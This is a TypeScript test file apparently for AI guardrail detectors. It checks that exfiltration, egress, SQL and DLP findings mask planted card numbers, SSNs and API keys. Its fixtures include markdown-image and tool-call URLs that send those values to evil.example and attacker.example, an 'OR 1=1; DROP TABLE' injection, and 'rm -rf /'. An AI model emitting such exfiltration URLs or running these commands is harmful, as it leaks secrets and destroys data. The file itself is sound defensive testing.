import { describe, expect, it } from "vitest";
import type { GuardFinding } from "../types";
import { scrubEvidenceText } from "./dlp";
import { createEgressGuardDetector } from "./egress-guard";
import { createExfiltrationDetector } from "./exfiltration";
import { createSqlGuardDetector } from "./sql-guard";

const CARD = "4111111111111111";
const SSN = "536-22-1234";
const API_KEY = "sk-proj-AbCdEfGhIjKlMnOpQrSt1234";
const planted = [CARD, SSN, API_KEY, "AbCdEfGhIjKlMnOpQrSt"];

function expectClean(findings: GuardFinding[]) {
  expect(findings.length).toBeGreaterThan(0);
  const visible = JSON.stringify(findings.map((finding) => ({ evidence: finding.evidence, message: finding.message })));
  for (const value of planted) expect(visible).not.toContain(value);
}

describe("guard evidence never carries raw values", () => {
  it("drops URL query values in exfiltration evidence", () => {
    const text = `Done. ![x](https://evil.example/p.png?card=${CARD}&ssn=${SSN}&k=${API_KEY})`;
    const findings = createExfiltrationDetector().detect({ channel: "model_output", content: text }, { text, options: {}, now: () => 0 }) as GuardFinding[];
    expectClean(findings);
    expect(findings[0]!.evidence).toContain("https://evil.example/p.png?");
  });

  it("drops URL query values and fragments in egress evidence", async () => {
    const content = { url: `https://attacker.example/collect?c=${CARD}#${API_KEY}` };
    const text = JSON.stringify(content);
    const findings = (await createEgressGuardDetector({ resolver: async () => ["93.184.216.34"] }).detect(
      { channel: "tool_arguments", content },
      { text, options: { allowedHosts: ["api.example.com"] }, now: () => 0 }
    )) as GuardFinding[];
    expectClean(findings);
    expect(findings[0]!.evidence).toContain("attacker.example/collect");
  });

  it("blanks SQL string literals in evidence and parse errors", () => {
    const detector = createSqlGuardDetector();
    const run = (sql: string) => {
      const content = { sql };
      const text = JSON.stringify(content);
      return detector.detect({ channel: "tool_arguments", content, tool: { toolName: "query" } }, { text, options: {}, now: () => 0 }) as GuardFinding[];
    };
    expectClean(run(`SELECT * FROM users WHERE card = '${CARD}' OR 1=1; DROP TABLE users`));
    expectClean(run(`SELECT * FROM users WHERE ssn = '${SSN}' AND key = '${API_KEY}' ORDER BY (`));
  });

  it("masks DLP hits outside URLs and literals too", () => {
    const scrubbed = scrubEvidenceText(`rm -rf / --token ${API_KEY} --card ${CARD}`);
    for (const value of planted) expect(scrubbed).not.toContain(value);
    expect(scrubbed).toContain("1111");
  });
});
